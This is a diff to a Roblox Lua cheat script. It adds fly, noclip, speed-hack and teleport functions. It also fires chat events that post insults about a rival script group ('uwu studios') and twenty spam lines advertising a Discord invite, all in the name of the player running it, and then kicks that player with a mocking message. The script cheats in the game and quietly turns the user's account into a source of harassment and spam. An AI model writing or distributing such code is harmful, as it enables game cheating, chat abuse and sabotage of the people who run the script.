@@ -1,11 +1,120 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
-wait(3)
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+
+local function nameCall()
+    local messages = {
+        "uwu studios fucking gpt pasters",
+        "uwu studios is nothing without chatgpt",
+        "discord.gg/hsx lowkey better",
+        "uwu studios cant code without gpt",
+        "stormz love skidding random mm2 scripts"
+    }
+    
+    for i, msg in ipairs(messages) do
+        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(msg, "All")
+        wait(0.5)
+    end
+end
+
+local flying = false
+local flySpeed = 50
+
+local function toggleFly()
+    flying = not flying
+    
+    if flying then
+        humanoid.PlatformStand = true
+        game:GetService("RunService").RenderStepped:Connect(function()
+            if flying then
+                local direction = Vector3.new(0, 0, 0)
+                local camera = game.Workspace.CurrentCamera
+                
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.W) then
+                    direction = direction + camera.CFrame.LookVector * Vector3.new(1, 0, 1)
+                end
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.S) then
+                    direction = direction - camera.CFrame.LookVector * Vector3.new(1, 0, 1)
+                end
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.A) then
+                    direction = direction - camera.CFrame.RightVector * Vector3.new(1, 0, 1)
+                end
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.D) then
+                    direction = direction + camera.CFrame.RightVector * Vector3.new(1, 0, 1)
+                end
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.Space) then
+                    direction = direction + Vector3.new(0, 1, 0)
+                end
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftShift) then
+                    direction = direction - Vector3.new(0, 1, 0)
+                end
+                
+                if direction.Magnitude > 0 then
+                    direction = direction.Unit * flySpeed
+                    rootPart.CFrame = rootPart.CFrame + direction
+                end
+            end
+        end)
+    else
+        humanoid.PlatformStand = false
+    end
+end
+
+local function toggleNoclip()
+    for _, part in pairs(character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = false
+        end
+    end
+    
+    character.DescendantAdded:Connect(function(part)
+        if part:IsA("BasePart") then
+            part.CanCollide = false
+        end
+    end)
+end
+
+local function spamChat()
+    for i = 1, 20 do
+        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("discord.gg/hsx " .. i, "All")
+        wait(0.1)
+    end
+end
+
+local function randomTeleport()
+    local positions = {
+        Vector3.new(0, 100, 0),
+        Vector3.new(1000, 100, 1000),
+        Vector3.new(-1000, 100, -1000),
+        Vector3.new(0, 500, 0)
+    }
+    
+    for _, pos in ipairs(positions) do
+        rootPart.CFrame = CFrame.new(pos)
+        wait(1)
+    end
+end
+
+local function speedHack()
+    humanoid.WalkSpeed = 100
+    humanoid.JumpPower = 200
+end
+
+nameCall()
+toggleFly()
+toggleNoclip()
+speedHack()
+spamChat()
+randomTeleport()
+
+wait(0.5)
 
 player:Kick("Yep And Were Detected Dont use skidded uwu studios hub because they are using chatgpt for all their scripts better join at discord.gg/hsx")
 
-wait(0.5)
+wait(0.2)
 
 for i = 1, 2 do
     spawn(function()
